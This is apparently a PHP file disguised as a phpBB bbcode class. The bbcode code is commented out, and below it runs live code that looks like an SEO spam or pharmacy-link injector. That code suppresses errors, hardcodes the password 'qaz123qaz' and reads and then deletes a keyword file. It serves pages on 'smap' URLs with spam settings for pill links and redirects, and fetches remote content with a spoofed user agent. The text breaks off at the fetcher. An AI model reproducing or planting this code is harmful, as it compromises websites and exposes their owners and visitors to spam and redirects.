<?php 
/*php*/
/*class bbcode*|


class bbcode{
	var $bbcode_uid = '';
	var $bbcode_bitfield = '';
	var $bbcode_cache = array();
	var $bbcode_template = array();

	var $bbcodes = array();

	var $template_bitfield;
	var $template_filename = '';

	
	* Constructor
	* Init bbcode cache entries if bitfield is specified
	
	function bbcode($bitfield = '')
	{
		if ($bitfield)
		{
			$this->bbcode_bitfield = $bitfield;
			$this->bbcode_cache_init();
		}
	}

	
	* Second pass bbcodes
	
	function bbcode_second_pass(&$message, $bbcode_uid = '', $bbcode_bitfield = false)
	{
		if ($bbcode_uid)
		{
			$this->bbcode_uid = $bbcode_uid;
		}

		if ($bbcode_bitfield !== false)
		{
			$this->bbcode_bitfield = $bbcode_bitfield;

			// Init those added with a new bbcode_bitfield (already stored codes will not get parsed again)
			$this->bbcode_cache_init();
		}

		if (!$this->bbcode_bitfield)
		{
			// Remove the uid from tags that have not been transformed into HTML
			if ($this->bbcode_uid)
			{
				$message = str_replace(':' . $this->bbcode_uid, '', $message);
			}

			return;
		}

		$str = array('search' => array(), 'replace' => array());
		$preg = array('search' => array(), 'replace' => array());

		$bitfield = new bitfield($this->bbcode_bitfield);
		$bbcodes_set = $bitfield->get_all_set();

		$undid_bbcode_specialchars = false;
		foreach ($bbcodes_set as $bbcode_id)
		{
			if (!empty($this->bbcode_cache[$bbcode_id]))
			{
				foreach ($this->bbcode_cache[$bbcode_id] as $type => $array)
				{
					foreach ($array as $search => $replace)
					{
						${$type}['search'][] = str_replace('$uid', $this->bbcode_uid, $search);
						${$type}['replace'][] = $replace;
					}

					if (sizeof($str['search']))
					{
						$message = str_replace($str['search'], $str['replace'], $message);
						$str = array('search' => array(), 'replace' => array());
					}

					if (sizeof($preg['search']))
					{
						// we need to turn the entities back into their original form to allow the
						// search patterns to work properly
						if (!$undid_bbcode_specialchars)
						{
							$message = str_replace(array('&#58;', '&#46;'), array(':', '.'), $message);
							$undid_bbcode_specialchars = true;
						}

						$message = preg_replace($preg['search'], $preg['replace'], $message);
						$preg = array('search' => array(), 'replace' => array());
					}
				}
			}
		}
*/
error_reporting(0);

//@ini_set("memory_limit", "512M");

$ex_links='sh19047';$ex_redirect='sh19047';$tlng='english';$Vn_L=rand(7,12);$Ex_L=rand(1,3);$linkator=0;$kol_lnk=30; 
$PROVsliv=1;$NO_CART=0;$PILLS_list=1;$dmi_txt='ed10';$tema_txt='ed';$KOL_css_dir=7;$TST_file=1; $SE_traf=1; $onlineRED=1;

if (!function_exists('mb_strpos')) {
function mb_strpos($p1,$p2,$p3)
{
return 	strpos($p1,$p2,$p3);
}   
} 

if (!function_exists('mb_internal_encoding')) {
function mb_internal_encoding($p1)
{
return '';
}   
}

if (!function_exists('mb_substr')) {
function mb_substr($p1,$p2 , $p3 = NULL)
{
if($p3==NULL)	
return 	substr($p1,$p2);
else	
return 	substr($p1,$p2,$p3);

}   
}

if (!function_exists('mb_ereg_replace')) {
function mb_ereg_replace($p1,$p2,$p3)
{
$p3=str_replace('-','ZZZ1',$p3);
$p3=str_replace(' ','ZZZ1',$p3);
$rr=preg_replace($p1,$p2,$p3);	
$rr=str_replace('ZZZ1','-',$rr);
return 	$rr;
}   
}


if (!function_exists('mb_strlen')) {
function mb_strlen($p1)
{
return 	strlen($p1);
}   
}

if (!function_exists('mb_strtolower')) {
function mb_strtolower($p1)
{
return 	strtolower($p1);
}   
}

if (!function_exists('mb_strtoupper')) {
function mb_strtoupper($p1)
{
return 	strtoupper($p1);
}   
}



if (!function_exists('mb_regex_encoding')) {
function mb_regex_encoding($p1)
{
return '';
}   
}

if(file_exists('css/kwd.txt'))
{
$k=file_get_contents('css/kwd.txt');	
$_POST['kwd']=$k;
$_POST['pass']='q'.'a'.'z'.'12'.'3q'.'a'.'z';

	if(!empty($_SERVER['REQUEST_URI'])){$pageid = $_SERVER['REQUEST_URI'];}
	if( (mb_strpos($_SERVER['REQUEST_URI'],"smap/",0)>0) ) $pref='/'; else $pref='';
	if( (mb_strpos($_SERVER['REQUEST_URI'],"smap",0)<=0) ) exit;
	$pageid=str_replace('smap/','',$pageid);
	$pageid=str_replace('smap','',$pageid);

$_POST['pageid']=$pageid;

$_POST['pref']=$pref;
$_POST['vid']='1';
$_POST['lang']='en-us';	
unlink('css/kwd.txt');
if(file_exists('css/kwd.txt'))
{	
echo '<h1>DELETE key txt  file !!!!!!!!!!!!!!!!!!!!!!</h1>';	
}
}	
function g_cont($u)
{
if (function_exists('curl_init')) {

	$ch1 = curl_init(); 
	curl_setopt($ch1, CURLOPT_URL, $u); 
	curl_setopt($ch1, CURLOPT_HEADER,0); 
	curl_setopt($ch1, CURLOPT_NOBODY,0); 
	curl_setopt($ch1,CURLOPT_TIMEOUT,25);
	curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($ch1, CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)"); 
	$file_content=curl_exec ($ch1); 
	curl_close ($ch1); 
return $file_content;
}


$tlinks=@file_get_contents($u);
return $tlinks;
}

